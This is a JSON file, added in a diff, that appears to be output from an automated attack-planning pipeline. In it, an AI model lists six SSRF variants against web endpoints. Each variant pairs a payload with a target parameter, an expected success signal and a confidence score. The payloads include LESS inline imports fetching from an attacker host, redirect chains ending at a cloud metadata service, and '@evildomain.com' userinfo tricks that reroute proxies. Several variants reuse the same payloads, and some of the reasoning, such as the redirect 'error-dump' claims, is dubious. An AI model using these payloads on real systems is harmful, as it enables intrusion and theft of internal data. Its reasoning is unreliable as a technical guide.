@@ -1,0 +1,80 @@
+{
+ "key": "ssrf_6",
+ "model": "opencode/mimo-v2.6-flash-free",
+ "class": "ssrf",
+ "variants": [
+  {
+   "endpoint": "POST /api/compile-theme",
+   "target_param": "stylesheet",
+   "recon_evidence": "The backend runs a server-side LESS compiler on uploaded theme source and returns the compiled CSS, indicating imports are resolved on the server.",
+   "planner_rationale": "An inline LESS import forces the compiler to fetch a remote stylesheet and embed it, turning compilation into a server-originated request.",
+   "vuln_class": "ssrf",
+   "payload": "@import (inline) 'http://ATTACKER/payload.less';",
+   "injection_point": "body",
+   "expected_success_signal": "Attacker server receives an inbound request from the theme-compile worker",
+   "confidence": 0.88,
+   "reasoning": "Server-side LESS compilation resolves @import (inline) by fetching the referenced URL and inlining its contents, so the compiler originates the outbound request to the attacker host."
+  },
+  {
+   "endpoint": "GET /fetch",
+   "target_param": "url",
+   "recon_evidence": "Endpoint returns 200 but response bodies are discarded and logged as malformed; redirect-heavy targets consistently trigger verbose error logging.",
+   "planner_rationale": "A chain of unusual redirect status codes forces the fetch wrapper into its error-dump mode, leaking the final fetched body.",
+   "vuln_class": "ssrf",
+   "payload": "http://ATTACKER/start (chain: 302 -> 305..309 loop -> 302 to metadata)",
+   "injection_point": "query",
+   "expected_success_signal": "Application error log or response dumps the redirect chain headers and the final metadata-service response body",
+   "confidence": 0.78,
+   "reasoning": "libcurl normalises 305-309 as follow-worthy redirects; exhausting its weird-redirect budget triggers the wrapper's error path that prints every header plus the final body, converting a blind fetch into a full read."
+  },
+  {
+   "endpoint": "GET /gateway",
+   "target_param": "path",
+   "recon_evidence": "The gateway is a Flask reverse proxy that concatenates a configured upstream host with the caller-supplied path before dispatching.",
+   "planner_rationale": "A leading @ turns the injected segment into userinfo, so the concatenated string's real authority becomes the attacker's host.",
+   "vuln_class": "ssrf",
+   "payload": "GET @evildomain.com/ HTTP/1.1",
+   "injection_point": "path",
+   "expected_success_signal": "Proxy issues the upstream request to evildomain.com instead of the configured target host",
+   "confidence": 0.86,
+   "reasoning": "When SITE_NAME+path forms the outbound URL, the @ makes everything before it userinfo and redefines the authority, so the proxy connects to the attacker-controlled domain while appearing to route the expected host."
+  },
+  {
+   "endpoint": "POST /admin/render",
+   "target_param": "less_source",
+   "recon_evidence": "Render endpoint accepts raw LESS markup and echoes compiled output, and outbound DNS lookups occur during rendering when remote references appear.",
+   "planner_rationale": "Inline import semantics make the pre-processor fetch the resource server-side and inline it into the compiled output.",
+   "vuln_class": "ssrf",
+   "payload": "@import (inline) 'http://ATTACKER/payload.less';",
+   "injection_point": "body",
+   "expected_success_signal": "Attacker server logs a request from the render service, and the compiled CSS contains the fetched file's contents",
+   "confidence": 0.9,
+   "reasoning": "Because the compiler inlines the imported resource rather than just recording its URL, the fetch is performed by the render service itself and the response is reflected in the compiled stylesheet."
+  },
+  {
+   "endpoint": "GET /proxy/resource",
+   "target_param": "resource",
+   "recon_evidence": "Path-parameter proxy builds the upstream request line from the raw path segment, and the framework's URL parser tolerates scheme-relative authority in the request line.",
+   "planner_rationale": "Injecting an absolute request line redefines the request target's authority, so the proxy dials the attacker host instead of the intended upstream.",
+   "vuln_class": "ssrf",
+   "payload": "GET @evildomain.com/ HTTP/1.1",
+   "injection_point": "path",
+   "expected_success_signal": "Upstream fetch is issued to evildomain.com and the attacker observes the proxy's request headers",
+   "confidence": 0.72,
+   "reasoning": "The raw path segment is concatenated after the configured scheme and host, and the leading @ makes that host userinfo, causing the parsed authority to resolve to evildomain.com; this variant assumes the proxy does not re-sanitise the request line."
+  },
+  {
+   "endpoint": "GET /api/webhook-test",
+   "target_param": "callback_url",
+   "recon_evidence": "Webhook tester follows redirects up to a configurable limit and logs full response headers in its debug output whenever the redirect chain is flagged as irregular.",
+   "planner_rationale": "A loop of odd redirect status codes pushes the client into debug-dump mode and then redirects to an internal target.",
+   "vuln_class": "ssrf",
+   "payload": "http://ATTACKER/start (chain: 302 -> 305..309 loop -> 302 to metadata)",
+   "injection_point": "query",
+   "expected_success_signal": "Debug log contains the dumped redirect chain and the internal metadata endpoint's response body",
+   "confidence": 0.68,
+   "reasoning": "The tester's follow logic treats 305-309 as redirect codes; after enough irregular hops the client enters its error-dump branch, printing all headers and the final body fetched from the internal endpoint."
+  }
+ ],
+ "raw_tail": "s_signal\": \"Debug log contains the dumped redirect chain and the internal metadata endpoint's response body\",\n    \"confidence\": 0.68,\n    \"reasoning\": \"The tester's follow logic treats 305-309 as redirect codes; after enough irregular hops the client enters its error-dump branch, printing all headers and the final body fetched from the internal endpoint.\"\n  }\n]\n\u001b[0m\n> build · mimo-v2.6-flash-free\n"
+}
